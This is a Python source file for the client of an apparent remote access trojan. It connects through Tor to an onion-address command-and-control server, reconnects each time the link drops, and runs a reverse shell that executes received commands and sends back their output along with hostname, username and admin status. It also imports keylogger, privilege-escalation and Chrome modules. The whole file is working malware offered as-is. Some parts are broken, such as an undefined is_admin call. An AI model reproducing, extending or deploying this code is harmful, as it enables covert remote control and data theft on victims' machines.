# import cv2
import json
import os
import socket
import subprocess
import sys
import threading
from sys import platform
from shutil import copyfile
import requests
from mss import mss
import time

# Local tools to the application
from tools import keylogger, privilege, chrome, peripherals

#importing tor network
from tor_network import ClientSocket, Tor

#constraints
ENCODING = 'utf-8'
BUFFER_SIZE = 4096

# Global socket variable
s = None

def reliable_send(data):
    try:
        json_data = json.dumps(data)
        length = len(json_data)
        length_header = f"{length:<10}".encode()  # Fixed length header
        s.send(length_header)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")
        raise

def reliable_recv():
    try:
        # First receive the length header
        length_header = s.recv(10).decode().strip()
        if not length_header:
            return None
        
        # Convert length header to int
        length = int(length_header)
        
        # Receive the actual data
        chunks = []
        bytes_received = 0
        while bytes_received < length:
            chunk = s.recv(min(length - bytes_received, BUFFER_SIZE))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
        
        data = b''.join(chunks).decode()
        
        try:
            return json.loads(data)
        except json.JSONDecodeError:
            return data.strip()
            
    except Exception as e:
        print(f"Error receiving data: {e}")
        raise

def shell():
    while True:
        try:
            command = reliable_recv()
            if not command:
                break
                
            if command == 'quit':
                break
            elif command == 'sysinfo':
                print(f"[*] Executing: {command}")
                info = {
                    'os': platform,
                    'hostname': socket.gethostname(),
                    'username': os.getlogin(),
                    'is_admin': is_admin()
                }
                reliable_send(info)
            elif command.startswith('cd '):
                print(f"[*] Executing: {command}")
                try:
                    os.chdir(command[3:])
                    reliable_send({
                        'success': True,
                        'cwd': os.getcwd(),
                        'output': f"Changed directory to: {os.getcwd()}"
                    })
                except Exception as e:
                    reliable_send({'error': str(e)})
            else:
                print(f"[*] Executing: {command}")
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send({
                    'output': result.decode(),
                    'cwd': os.getcwd()
                })
                
        except Exception as e:
            print(f"[!] Error executing command: {e}")
            reliable_send({'error': str(e)})
            continue

def connect():
    global s
    while True:
        try:
            # Create new socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # Set timeout for connection attempts
            
            # Get connection details from Tor
            tor = Tor()
            onion, port = tor.read_address_from_binary()
            print(f'Connecting to: {onion}:{port}')
            
            # Create Tor connection
            clientsock = ClientSocket(onion, port)
            s = clientsock.create_connection()
            
            print("Connected to C2 server")
            shell()
            break
            
        except Exception as e:
            print(f"Connection error: {e}")
            if s:
                s.close()
            time.sleep(5)  # Wait before retrying
            continue
        finally:
            if s:
                s.close()

if __name__ == "__main__":
    while True:
        try:
            connect()
        except KeyboardInterrupt:
            print("\nExiting...")
            if s:
                s.close()
            sys.exit(0)
        except Exception as e:
            print(f"Fatal error: {e}")
            time.sleep(10)  # Wait before restarting